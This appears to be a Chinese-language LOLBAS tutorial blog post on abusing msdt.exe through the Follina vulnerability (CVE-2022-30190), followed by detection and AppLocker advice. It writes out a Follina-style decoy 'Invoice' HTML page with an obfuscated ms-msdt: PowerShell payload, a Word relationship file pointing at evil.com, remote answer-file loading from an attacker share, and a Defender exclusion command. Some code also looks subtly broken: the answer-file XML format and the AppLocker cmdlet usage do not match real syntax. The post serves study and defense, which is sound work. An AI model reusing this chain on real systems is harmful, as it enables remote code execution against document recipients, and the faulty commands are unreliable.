---
title: "LOLBAS鐵人賽Day11Msdt.exe：微軟診斷工具的 RCE 漏洞"
published: 2025-09-25T11:17:46.000Z
description: "LOLBAS 系列第 11 天"
tags: [LOLBAS, Windows, Security]
category: Research
draft: false
---

Msdt.exe 是用來執行疑難排解套件的工具，  
但在 2022 年的 Follina (CVE-2022-30190) 漏洞讓全世界見識到它的危險性

## MSDT 是什麼？

* * *

### 診斷工具架構

MSDT (Microsoft Support Diagnostic Tool) 的運作方式：

*   **疑難排解套件 (.diagcab)**：包含診斷腳本的壓縮檔
*   **診斷清單 (.diagpkg)**：XML 格式的診斷設定
*   **ms-msdt: 協議**：URL 協議處理器，可從瀏覽器呼叫 msdt
*   **Answer File**：自動化診斷的 XML 設定檔

### 正常的 MSDT 使用

```cmd
# 執行疑難排解套件
msdt.exe /cab C:\Windows\diagnostics\system\networking\DiagPackage.diagcab

# 使用 Answer File
msdt.exe /af C:\ProgramData\Microsoft\Windows\WDI\{67144949-5132-4859-8036-a737b43825d8}\{e4a50vitals.xml}

# 透過 ID 執行
msdt.exe /id NetworkDiagnosticsWeb

```

重點是：msdt.exe 可以透過 URL 協議被遠端呼叫，這就是我們這次的主要攻擊點！

## 攻擊流程

* * *

### Step 1: 建立惡意 Answer File

`malicious_answer.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<PackageConfiguration>
    <PowerShellScript>
        <Arguments>Start-Process calc.exe</Arguments>
        <RequireElevation>false</RequireElevation>
    </PowerShellScript>
    
    <Execution>
        <CommandLine>cmd.exe /c echo MSDT_Executed > C:\Windows\Temp\msdt_test.txt</CommandLine>
        <RequiresElevation>false</RequiresElevation>
    </Execution>
</PackageConfiguration>

```

### Step 2: 建立 ms-msdt URL

基本格式：

```
ms-msdt:/id PCWDiagnostic /skip force /param "arg1 value1" /param "arg2 value2"

```

惡意 URL（Follina 風格）：

```html
<!-- 惡意 HTML -->
<!DOCTYPE html>
<html>
<head>
    <title>Invoice</title>
</head>
<body>
    <script>
        // 透過 ms-msdt 協議執行
        window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=cal?c IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+'::UTF8.GetString([System.Convert]'+'::FromBase64String('+'\\'ZWNobyBIYWNrZWQh\\''))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\"";
    </script>
</body>
</html>

```

### Step 3: 各種執行方式

#### 方法一：直接執行（需要檔案）

```cmd
# 執行本地 Answer File
msdt.exe /af C:\TestLab\malicious_answer.xml

# 執行遠端 Answer File（可能被阻擋）
msdt.exe /af \\evil-server\share\answer.xml

```

#### 方法二：透過 Office 文件（Follina 攻擊）

建立惡意 Word 文件：

1.  建立 .docx 檔案
2.  插入外部關係指向惡意 HTML
3.  HTML 包含 ms-msdt: URL
4.  使用者開啟文件時自動觸發

`_rels/document.xml.rels`:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" 
                  Target="https://evil.com/malicious.html!" 
                  TargetMode="External"/>
</Relationships>

```

#### 方法三：PowerShell 觸發

```powershell
# 直接呼叫
Start-Process "msdt.exe" -ArgumentList "/id PCWDiagnostic /skip force"

# 透過 COM 物件
$shell = New-Object -ComObject Shell.Application
$shell.ShellExecute("msdt.exe", "/af C:\TestLab\answer.xml")

# 建立捷徑
$ws = New-Object -ComObject WScript.Shell
$shortcut = $ws.CreateShortcut("C:\TestLab\diagnostic.lnk")
$shortcut.TargetPath = "msdt.exe"
$shortcut.Arguments = "/id PCWDiagnostic"
$shortcut.Save()

```

## 實際測試（Windows 11）

* * *

### 測試環境準備

```cmd
mkdir C:\TestLab
cd C:\TestLab
powershell -c "Add-MpPreference -ExclusionPath 'C:\TestLab'"

```

### 基本功能測試

```cmd
:: 列出可用的診斷包
msdt.exe /id PCWDiagnostic

:: 測試基本執行（會開啟診斷視窗）
msdt.exe /id NetworkDiagnosticsWeb /skip true

```

### Follina 概念驗證（已修補但概念重要）

```powershell
# 建立測試 HTML
@'
<html>
<head>
<script>
location.href = "ms-msdt:/id PCWDiagnostic /skip force";
</script>
</head>
</html>
'@ | Out-File -FilePath C:\TestLab\test.html

# 開啟會觸發 msdt（但不會執行惡意程式碼）
Start-Process C:\TestLab\test.html

```

## 偵測&防禦建議

* * *

### 關鍵偵測指標

*   `msdt.exe` + `/af` 參數
*   `msdt.exe` 從 Office 程序啟動
*   `ms-msdt:` 協議在網頁或文件中
*   msdt.exe 產生 PowerShell/cmd 子程序

### 群組原則防護

```powershell
# 透過 AppLocker 限制 msdt.exe
New-AppLockerPolicy -RuleType Exe -Publisher "*" -User Everyone -Action Deny -Path "%WINDIR%\System32\msdt.exe"

# 限制從 Office 啟動
$rule = @"
<AppLockerPolicy Version="1">
  <RuleCollection Type="Exe" EnforcementMode="Enabled">
    <FilePathRule Id="Block_MSDT_From_Office" Name="Block MSDT from Office" 
                  Description="Prevent Office from launching MSDT" 
                  UserOrGroupSid="S-1-1-0" Action="Deny">
      <Conditions>
        <FilePathCondition Path="%WINDIR%\System32\msdt.exe"/>
      </Conditions>
    </FilePathRule>
  </RuleCollection>
</AppLockerPolicy>
"@

```

## Follina (CVE-2022-30190) 深入解析

* * *

### 漏洞原理

1.  Office 支援外部 OLE 物件關係
2.  關係可指向 HTML 檔案
3.  HTML 可包含 ms-msdt: URL
4.  MSDT 執行時可帶參數執行 PowerShell

### 攻擊鏈

```
Word 文件  外部關係  惡意 HTML  ms-msdt: URL  msdt.exe  PowerShell

```

### 為什麼這麼危險？

*   **零點擊執行** - Protected View 也擋不住
*   **繞過巨集限制** - 不需要啟用巨集
*   **難以偵測** - 使用合法工具

## 總結！

* * *

MSDT 的危險性：

*   **URL 協議支援** - 可從瀏覽器/文件觸發
*   **PowerShell 執行** - 透過診斷腳本
*   **系統信任** - Microsoft 簽章工具
*   **Follina 遺毒** - 雖已修補但概念仍可用